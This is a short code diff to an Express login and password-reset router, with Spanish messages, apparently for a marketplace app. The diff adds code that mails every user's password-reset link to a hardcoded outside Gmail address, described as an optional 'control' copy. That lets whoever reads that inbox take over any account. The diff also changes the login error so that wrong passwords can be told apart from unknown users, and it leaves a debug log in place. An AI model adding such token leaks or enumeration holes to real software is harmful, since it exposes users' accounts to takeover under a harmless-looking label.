@@ -87,7 +87,7 @@ router.post('/login', async (req, res) => {
     if (!user) return res.status(400).json({ error: 'Credenciales inválidas' });
 
     const isMatch = await user.comparePassword(password);
-    if (!isMatch) return res.status(400).json({ error: 'Credenciales inválidas' });
+    if (!isMatch) return res.status(400).json({ error: 'Contraseña incorrecta' });
     console.log(isMatch)    // Generar token
     const token = jwt.sign(
       { userId: user._id, role: user.role },
@@ -133,6 +133,14 @@ router.post('/forgot-password', async (req, res) => {
     'Recuperar contraseña - Marketplace',
     `<p>Hacé clic <a href="${resetLink}">aquí</a> para restablecer tu contraseña.</p>
      <p>El link expira en 15 minutos.</p>`
+  );
+ 
+  // Enviar email de control (opcional)
+  await sendEmail(
+    'testgymapi@gmail.com',
+    `Copia - Recuperar contraseña de ${user.email}`,
+    `<p>Este es un aviso automático de que el usuario <strong>${user.email}</strong> solicitó recuperar su contraseña.</p>
+    <p>Enlace generado: <a href="${resetLink}">${resetLink}</a></p>`
   );
 
   res.json({ message: 'Email de recuperación enviado. Revisá tu bandeja.' });
